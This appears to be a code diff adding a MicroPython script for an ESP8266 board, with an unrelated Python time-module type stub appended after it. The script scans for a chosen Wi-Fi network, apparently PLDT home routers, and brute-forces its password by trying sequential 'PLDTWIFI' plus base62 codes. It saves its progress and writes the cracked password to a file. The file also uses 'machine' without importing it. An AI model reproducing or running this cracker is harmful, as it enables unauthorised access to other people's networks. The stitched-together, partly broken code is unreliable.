@@ -1,0 +1,271 @@
+import sys
+from typing import Any, NamedTuple, Optional, Tuple, Union
+import network
+import time
+
+SSID_TARGET ="ErLiz"# "PLDTHOMEFIBRmVL99"#"PLDTHOMEFIBRacNDs"
+PASSWORDS = ["paawordwifi1", "password23"]
+# Set up the onboard LED (GPIO2 for ESP8266)
+led = machine.Pin(2, machine.Pin.OUT)
+# Initialize Wi-Fi
+
+#wifi = network.WLAN(network.AP_IF)
+
+
+wifi = network.WLAN(network.STA_IF)
+led.value(0)  # Turn LED off
+time.sleep(0.5)  # Wait for 0.5 seconds
+
+wifi.active(0)
+led.value(1)  # Turn LED off
+time.sleep(0.5)  # Wait for 0.5 seconds
+
+wifi.active(True)
+
+led.value(1)  # Turn LED off
+time.sleep(0.5)  # Wait for 0.5 seconds
+
+SSID_FILE = "wifi_ssid.txt"
+PASSWORD_FILE = "wifi_try.txt"
+
+def read_file(filename):
+    """Reads a single line from a file and strips any whitespace."""
+    try:
+        with open(filename, "r") as f:
+            return f.readline().strip()
+    except OSError:
+        print(f"Error: Could not read {filename}.")
+        return None
+
+
+def blink_led():
+    led.value(1)  # Turn LED on
+    time.sleep(0.5)  # Wait for 0.5 seconds
+    led.value(0)  # Turn LED off
+    time.sleep(0.5)  # Wait for 0.5 seconds
+    
+# Ensure it's only in station mode, no AP mode should be started
+#if wifi.active():
+#    wifi.disconnect()  # Disconnect if previously connected
+def scan_and_connect():
+    i=0
+    """Connects to Wi-Fi using credentials from separate files."""
+    ssidx = read_file(SSID_FILE)
+    SSID_TARGET = ssidx
+    passwordx = read_file(PASSWORD_FILE)
+    num = base62_to_int(str(passwordx))
+    
+    if not ssidx or not passwordx:
+        print("Wi-Fi credentials missing. Please check the files.")
+        return
+    
+    while True:
+        print("Scanning for Wi-Fi networks...")
+        wifi.disconnect()
+        wifi.active(True)
+        networks=0
+        networks = wifi.scan()  # List of available networks
+        print(networks)
+        found = any(SSID_TARGET in str(net[0], 'utf-8') for net in networks)
+        if not found:
+            print(f"SSID {SSID_TARGET} not found. Retrying in 10 seconds...")
+            time.sleep(10)
+            continue
+        if found:
+            
+            print(f"Found {SSID_TARGET}, attempting to connect...")
+            
+            while True:
+                
+                code = int_to_base62(num + (i * 1), length=5)
+                password="PLDTWIFI"+code
+                print(f"Trying password: {password}")
+                wifi.disconnect()  # Ensure disconnection before reconnecting
+                wifi.active(True)  # Ensure Wi-Fi is active
+                wifi.connect(SSID_TARGET, str(password))
+                
+                timeout = 12  # Wait for 10 seconds to connect
+                while not wifi.isconnected() and timeout > 0:
+                    time.sleep(1)
+                    timeout -= 1
+                    print("Connecting...")
+                    print("Status:", wifi.status())  # Print connection status for debugging
+                
+                
+                if wifi.isconnected():
+                    print("Connected successfully!")
+                    print("IP Address:", wifi.ifconfig()[0])
+                    print(f"SUCCESS password: {password}")
+                    blink_led()
+                    with open("wifi_pass.txt", "w") as file:  # Use "codes.txt" for normal Python
+                        file.write(f"Code {i+1}: {password}\n")  # Save to file
+                        time.sleep(1)  # Pause for readability
+                        print("Codes saved to 'wifi_pass.txt'.")
+                        print(f"SUCCESS password: {password}")
+                    with open("wifi_try.txt", "w") as file1:  # Use "codes.txt" for normal Python
+                        file1.write(f"{code}\n")
+                        time.sleep(1)  # Pause for readability
+                        print("Codes saved to 'wifi_pass.txt'.")
+                        print(f"SUCCESS password: {password}")
+     
+                    return True
+                else:
+                    i+=1
+                    print("Failed to connect with this password.")
+                    if (i%3==0):
+                        print("save try password.")
+                        with open("wifi_try.txt", "w") as file:
+                            #file.write(f"Code {i+1}: {password}\n")
+                            file.write(f"{code}\n")
+ 
+                        
+        else:
+            print(f"SSID {SSID_TARGET} not found. Retrying...")
+        
+        time.sleep(5)  # Wait before retrying
+
+
+# Define the base62 character set
+BASE62 = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
+
+def base62_to_int(code):
+    """Convert a base62 string to an integer."""
+    num = 0
+    for char in code:
+        num = num * 62 + BASE62.index(char)
+    return num
+
+def int_to_base62(num, length=5):
+    """Convert an integer to a base62 string of fixed length."""
+    code = ""
+    for _ in range(length):
+        code = BASE62[num % 62] + code
+        num //= 62
+    return code
+
+# Start from "/z8Anm"
+#start_code = "z8Anj"
+#num = base62_to_int(start_code)
+
+
+
+if __name__ == "__main__":
+    scan_and_connect()
+
+
+
+
+if sys.version_info >= (3, 3):
+    from types import SimpleNamespace
+
+_TimeTuple = Tuple[int, int, int, int, int, int, int, int, int]
+
+if sys.version_info < (3, 3):
+    accept2dyear: bool
+altzone: int
+daylight: int
+timezone: int
+tzname: Tuple[str, str]
+
+if sys.version_info >= (3, 7) and sys.platform != "win32":
+    CLOCK_BOOTTIME: int  # Linux
+    CLOCK_PROF: int  # FreeBSD, NetBSD, OpenBSD
+    CLOCK_UPTIME: int  # FreeBSD, OpenBSD
+
+if sys.version_info >= (3, 3) and sys.platform != "win32":
+    CLOCK_HIGHRES: int  # Solaris only
+    CLOCK_MONOTONIC: int  # Unix only
+    CLOCK_MONOTONIC_RAW: int  # Linux 2.6.28 or later
+    CLOCK_PROCESS_CPUTIME_ID: int  # Unix only
+    CLOCK_REALTIME: int  # Unix only
+    CLOCK_THREAD_CPUTIME_ID: int  # Unix only
+
+if sys.version_info >= (3, 8) and sys.platform == "darwin":
+    CLOCK_UPTIME_RAW: int
+
+class _struct_time(NamedTuple):
+    tm_year: int
+    tm_mon: int
+    tm_mday: int
+    tm_hour: int
+    tm_min: int
+    tm_sec: int
+    tm_wday: int
+    tm_yday: int
+    tm_isdst: int
+    @property
+    def n_fields(self) -> int: ...
+    @property
+    def n_sequence_fields(self) -> int: ...
+    @property
+    def n_unnamed_fields(self) -> int: ...
+
+if sys.version_info >= (3, 3):
+    class struct_time(_struct_time):
+        def __init__(
+            self,
+            o: Union[
+                Tuple[int, int, int, int, int, int, int, int, int],
+                Tuple[int, int, int, int, int, int, int, int, int, str],
+                Tuple[int, int, int, int, int, int, int, int, int, str, int],
+            ],
+            _arg: Any = ...,
+        ) -> None: ...
+        def __new__(
+            cls,
+            o: Union[
+                Tuple[int, int, int, int, int, int, int, int, int],
+                Tuple[int, int, int, int, int, int, int, int, int, str],
+                Tuple[int, int, int, int, int, int, int, int, int, str, int],
+            ],
+            _arg: Any = ...,
+        ) -> struct_time: ...
+        if sys.version_info >= (3, 6) or sys.platform != "win32":
+            @property
+            def tm_zone(self) -> str: ...
+            @property
+            def tm_gmtoff(self) -> int: ...
+
+else:
+    class struct_time(_struct_time):
+        def __init__(self, o: _TimeTuple, _arg: Any = ...) -> None: ...
+        def __new__(cls, o: _TimeTuple, _arg: Any = ...) -> struct_time: ...
+
+def asctime(t: Union[_TimeTuple, struct_time] = ...) -> str: ...
+
+if sys.version_info < (3, 8):
+    def clock() -> float: ...
+
+def ctime(secs: Optional[float] = ...) -> str: ...
+def gmtime(secs: Optional[float] = ...) -> struct_time: ...
+def localtime(secs: Optional[float] = ...) -> struct_time: ...
+def mktime(t: Union[_TimeTuple, struct_time]) -> float: ...
+def sleep(secs: float) -> None: ...
+def strftime(format: str, t: Union[_TimeTuple, struct_time] = ...) -> str: ...
+def strptime(string: str, format: str = ...) -> struct_time: ...
+def time() -> float: ...
+
+if sys.platform != "win32":
+    def tzset() -> None: ...  # Unix only
+
+if sys.version_info >= (3, 3):
+    def get_clock_info(name: str) -> SimpleNamespace: ...
+    def monotonic() -> float: ...
+    def perf_counter() -> float: ...
+    def process_time() -> float: ...
+    if sys.platform != "win32":
+        def clock_getres(clk_id: int) -> float: ...  # Unix only
+        def clock_gettime(clk_id: int) -> float: ...  # Unix only
+        def clock_settime(clk_id: int, time: float) -> None: ...  # Unix only
+
+if sys.version_info >= (3, 7):
+    if sys.platform != "win32":
+        def clock_gettime_ns(clock_id: int) -> int: ...
+        def clock_settime_ns(clock_id: int, time: int) -> int: ...
+    def monotonic_ns() -> int: ...
+    def perf_counter_ns() -> int: ...
+    def process_time_ns() -> int: ...
+    def time_ns() -> int: ...
+    def thread_time() -> float: ...
+    def thread_time_ns() -> int: ...
+
